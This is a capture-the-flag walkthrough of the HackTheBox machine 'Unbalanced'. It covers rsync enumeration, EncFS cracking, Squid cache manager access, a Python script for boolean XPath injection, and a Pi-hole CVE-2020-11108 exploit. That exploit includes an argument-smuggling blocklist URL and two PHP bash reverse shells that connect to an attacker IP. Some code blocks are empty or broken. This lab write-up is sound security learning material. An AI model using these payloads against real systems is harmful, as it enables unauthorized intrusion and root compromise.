Hi everyone, today we are going to be looking at Unbalanced --`10.10.10.200`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

## Information Gathering

In order to start the VM, we start with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bat

</details>

From the output shown above, we can see that the machine is a Linux machine, and I added `unbalanced.htb` to the `/etc/hosts` file. When browsing to <http://unbalanced.htb:3128> we were presented with the following web page:

<p class="imgMiddle">

</p>

It didn't seem likely that anything would initially be available using the Squid proxy, you could use squid as a way of enumerating local ports through ffuf, however I decided to move on to the other open port -- rsync using TCP port 873. 

### rsync Enumeration

> rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification timesand sizes of files. It is commonly found on Unix-like operating systems. The rsync algorithm is a type of delta encoding, and is used for minimizing network usage. Zlib may be used for additional data compression, and SSH or stunnel can be used for security.

The following URL <https://blog.netspi.com/linux-hacking-case-studies-part-1-rsync> has a ton of information about using rsync for enumeration. After connecting to the port with netcat, it will return the rsync version. As described in the blog post above, in order to enumerate the service we need to begin by including the same banner version back to the host, following on from that we can begin enumeration using the `#list` command. 

<details>

```bat

vagrant@ko:~/Desktop/HackTheBox/Unbalanced$ nc -vn 10.10.10.200 873
(UNKNOWN) [10.10.10.200] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
conf_backups    EncFS-encrypted configuration backups
```
</details>

As shown above, I managed to enumerate the `conf_backups` folder from the server. Using this information, I was able to use the rsync protocol to retrieve encrypted data using the following command:

```bat
rsync 10.10.10.200::conf_backups
```

<details>

```bat
vagrant@ko:~$ rsync 10.10.10.200::
conf_backups    EncFS-encrypted configuration backups
vagrant@ko:~$ rsync 10.10.10.200::conf_backups

I downloaded the entire directory in order to determine what to do going forward. As we can see, this is most likely meant to be an encrypted `encfs.xml` file due to the presence of the `.encfs6.xml` file. The contents of the file are shown below:

Using the folder contents I previously downloaded, I could use John the Ripper to convert the encrypted file system (EncFS) to the required format:

```bat
/usr/share/john/encfs2john.py rsync/ > rsync.xml.john

vagrant@ko:~/Desktop/HackTheBox/Unbalanced$ cat rsync.xml.john 
rsync/:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add
```

Now that I had the folder in the required format and I have the password hash, I could use John the Ripper again in an attempt to crack the password:

<details>

```bat

Success! We now have the password `bubblegum`. More information about cracking encrypted file systems is described here: <https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml>. Since we have the password, we can now mount the directory using the following `encfs` command:

```bat
vagrant@ko:~/Desktop/HackTheBox/Unbalanced$ encfs ~/Desktop/HackTheBox/Unbalanced/rsync/ ~/Desktop/HackTheBox/Unbalanced/encfs_mount/
```

With the file system now mounted, we are able to access the folder just as if we were on the host, and we have access to all the files. The folder contents are shown in the image below:

### Squid Proxy

Browsing through the file contents, I decided to view the contents of `squid.conf` since the squid proxy port on the host was open:

<details>

```conf
# Recommended minimum configuration:
#

# Example rule allowing access from your local networks.
# Adapt to list your (internal) IP networks from where browsing
# should be allowed
acl localnet src 0.0.0.1-0.255.255.255  # RFC 1122 "this" network (LAN)

acl localnet src fc00::/7               # RFC 4193 local private network range
acl localnet src fe80::/10              # RFC 4291 link-local (directly plugged) machines

acl SSL_ports port 443
acl Safe_ports port 80          # http
acl Safe_ports port 21          # ftp

acl CONNECT method CONNECT

#
# INSERT YOUR OWN RULE(S) HERE TO ALLOW ACCESS FROM YOUR CLIENTS
#
include /etc/squid/conf.d/*

# Example rule allowing access from your local networks.
# Adapt localnet in the ACL section to list your (internal) IP networks
# from where browsing should be allowed
#http_access allow localnet
http_access allow localhost

# Allow access to intranet
acl intranet dstdomain -n intranet.unbalanced.htb
acl intranet_net dst -n 172.16.0.0/12
http_access allow intranet
http_access allow intranet_net

# And finally deny all other access to this proxy
http_access deny all

```
</details>


The contents shown above were the parts that I deemed most relevant. They included some local subnets as well as additional ACLs for safe ports. Additionally, the file included a new subnet: `intranet.unbalanced.htb` which I added to the `/etc/hosts` file. From there, I decided to search for passwords within the files using grep:

```bat
grep -R passwd
```

<details>

```conf
vagrant@ko:~/Desktop/HackTheBox/Unbalanced/encfs_mount$ grep -R passwd
reportbug.conf:# smtppasswd XXX
squid.conf:#  TAG: cachemgr_passwd
squid.conf:#    Usage: cachemgr_passwd password action action ...

squid.conf:cachemgr_passwd disable all
nsswitch.conf:passwd:         files systemd
adduser.conf:# Please note that system software, such as the users allocated by the base-passwd

```
</details>

As shown above, I now has access to the Cache Manager password: `Thah$Sh1`. Before I decided to work with the cache manager, I added a squid proxy connection to Firefox and browsed to the web application which presented me with the following web page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img3.png"  style="width: 70%" />
</p>

The web application didn't seem to have an exploitable login page, so I decided to continue enumerating the cache manager. In order to interact with it, I needed to install squid client on my Kali machine:

```bat
sudo apt-get install squidclient
```

You could also interact with squid through HTTP requests, but I prefer to use squid client. Once the squid client was installed, I was able to list the available menu options using the following command:

```bat
squidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:menu
```

As shown above, very few operations were allowed (most operations were disabled on the host). I decided to start with looking into the `fqdncache`:

From the information shown above, I now had access to additional hosts through the squid proxy: `172.31.179.2` and `172.31.179.3`, I also assumed that based on this, there was a `172.31.179.1` host available.

### XPath / SQL Based Injection

When navigating to `http://172.31.179.2/intranet.php` and `http://172.31.179.3/intranet.php`, the web page that I was presented with was the same as the one shown above. However, upon navigating to `http://172.31.179.1/intranet.php`, the web page's login form was found to be vulnerable to XPath/SQL based injection. A simple check within both the username and password fields for `' or' 1=1 --` resulted in the following:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img4.png"  style="width: 50%" />
</p>

We now had information for the following accounts:
* rita@unbalanced.htb
* jim@unbalanced.htb
* bryan@unbalanced.htb
* sarah@unbalanced.htb

After playing with the fields for a while, I determine that it was the password field that was injectable, not the username field -- more information on XPath injection can be found here: <https://owasp.org/www-community/attacks/XPATH_Injection>. Based on this, it was possible to create a simple Python based script to extract the passwords for each of the aforementioned users using Boolean based XPath injection:

<details>

```python
#!/usr/bin/python3
import string
from bs4 import BeautifulSoup
import requests


def check_result(i,c):
    payload={"Username": "doesntmatter","Password": f"' or substring(Password,{i},1)='{c}"}
    url = "http://172.31.179.1/intranet.php"
    proxy = {"http": "http://10.10.10.200:3128"}
    r = requests.post(url,data=payload, proxies=proxy)
    return r

def brute():
    usernames = ["rita", "jim", "bryan", "sarah"]
    for user in usernames:
            print(f"{user}: ", end="", flush=True)
            for i in range(1, 33):
                for c in string.printable[:-5]:
                    print(c, end="", flush=True)
                    r = check_result(i,c)
                    soup = BeautifulSoup(r.text, "html.parser")
                    if d := soup.find("div", {"class": "m4"}):
                        if [p for p in d.find_all("p", {"class": "w3-opacity"}) if p.text.strip() == user]:
                            break
                    print("\b", end="", flush=True)
                else:
                    print(" ")
                    break
brute()

```

## Lateral Movement using Bryan

Using the credentials above, I attempted to log in to the host using the other open port -- SSH. The credentials for Bryan worked and I was able to successfully authenticate to the host:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img5.png"  style="width: 70%" />
</p>

Based on the simple host enumeration from the commands above, `ifconfig` did not work on the host. In order to determine the IP Address, I used the `ip` commands:

<details>

```text

bryan@unbalanced:/$ ip n
10.10.10.2 dev ens160 lladdr 00:50:56:b9:30:b0 REACHABLE

fe80::250:56ff:feb9:30b0 dev ens160 lladdr 00:50:56:b9:30:b0 router STALE
```

</details>

After running the above command I now had information about a new IP Address: `172.31.11.3`, additionally, I found a TODO file on the host which contained the following information:

```text

```

### Pi-Hole Exploitation

Based on the information about the Pi-Hole shown above, I navigated to the IP address through the squid proxy and was presented with the default Pi-Hole page and administration panel. Using the default administrator password: `admin`, I was able to log in to the administrative panel:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img6.png"  style="width: 100%" />
</p>

The footer of the Pi-Hole web application revealed the following information:
* Pi-hole Version  v4.3.2            
* Web Interface Version v4.3            
* FTL Version  v4.3.1     
            
Some basic Google searches lead me to the following post: <https://frichetten.com/blog/cve-2020-11108-pihole-rce/>.

> The following is a technical writeup for CVE-2020-11108, a vulnerability that allows an authenticated user of the Pi-hole web application to gain remote code execution and escalate privileges to root. This vulnerability affects Pi-hole v4.4 and below.

Using the information described in the blog post, I attempted to exploit the administrative interface to gain a privileged shell on the host. The first phase of the exploitation began with:

* Create a netcat listener locally.
* Navigating to Settings &rarr; Blocklists.
* Enter the following payload as a new URL.

```bat
http://10.10.14.21#" -o fun.php -d "
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img7.png"  style="width: 70%" />
</p>

Now that the URL was added to the blocklist, I needed to Click "Save and Update", and a few seconds later, I received a connection back to my netcat listener on port 80. Once the connection was established, I needed to do the following:

1. Provide a 200 response to the initial connection `HTTP/1.1 200 OK`
2. Hit enter twice, type some random words, hit enter twice, Ctrl+c
3. Restart the netcat listener and click update again
4. Enter reverse shell payload

The reverse shell payload is provided below:

```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.21/8888 0>&1'");
?>
```

In addition to the above commands, I also needed to create a new netcat listener on port 8888 in order to interact with the reverse shell --  The image below shows the sequence of HTTP requests:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img8.png"  style="width: 70%" />
</p>

Once the requests were submitted, the Pi-Hole was successfully exploited and I received a connection back from the host as shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img9.png"  style="width: 70%" />
</p>

Since this is an IoT device, they are generally insecure and you would have been able to skip the next part and read the relevant files within the root directory in order to complete this machine. However, I wanted to complete the exploit and gain a privileged shell on the Pi-Hole itself. 

## Privilege Escalation using Pi-Hole

Now that I had access to the `www-data` user on the host, I was able to being the second portion of the exploit. The second portion was nearly identical to the previous one, the main difference being that I was simply overwriting the `teleporter.php` file on the server with an additional reverse shell.

As with the initial foothold and using the information described in the blog post, I attempted to exploit the administrative interface to gain a privileged shell on the host. The second phase of the exploitation began with:

* Creating a netcat listener locally.
* Navigating to Settings &rarr; Blocklists.
* Enter the following payload as a new URL.

```bat
http://10.10.14.21#" -o teleporter.php -d "
```

</p>

Now that the URL was added to the blocklist, I needed to Click "Save and Update", and a few seconds later, I received a connection back to the netcat listener on port 80. Once the connection was established, I needed to do the following:

1. Provide a 200 response to the initial connection `HTTP/1.1 200 OK`
2. Hit enter twice, type some words, hit enter twice, Ctrl+c
3. Restart listener and click update again
4. Enter reverse shell payload

The reverse shell payload is provided below:

```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.21/9999 0>&1'");
?>
```

In addition to the above commands, I also needed to create a new netcat listener on port 9999 --  The image below shows the sequence of HTTP requests:

> With a shell youâ€™ve gained previously, run `sudo pihole -a -t` (www-data has a sudo rule to call pi-hole). This command will call `teleporter.php` as root. If youâ€™ve overwritten it with a reverse shell payload (for example) you will be root.

Once the requests were submitted and I ran `sudo pihole -a -t` using the initial reverse shell, the Pi-Hole was successfully exploited and I received a connection back from the host as shown below:

### Gaining Root access to the host

Now this doesn't mean that we are root on the box, we are just root on the Pi-Hole. Navigating to `/root`, we can see two files, 
* ph_install.sh
* pihole_config.sh

Opening `pihole_config.sh`, we can see that we have plaintext credentials for the admin interface.

<details>

```conf
cat pihole_config.sh
#!/bin/bash

# Add domains to whitelist
/usr/local/bin/pihole -w unbalanced.htb
/usr/local/bin/pihole -w rebalanced.htb

# Set temperature unit to Celsius
/usr/local/bin/pihole -a -c

# Add local host record
/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1

# Set privacy level
/usr/local/bin/pihole -a -l 4

# Set web admin interface password
/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'

# Set admin email
/usr/local/bin/pihole -a email admin@unbalanced.htb
```
</details>

As a final step, I needed to return to the initial SSH session with the Bryan user and I was able to elevate my privileges to the root user using the `su` command:
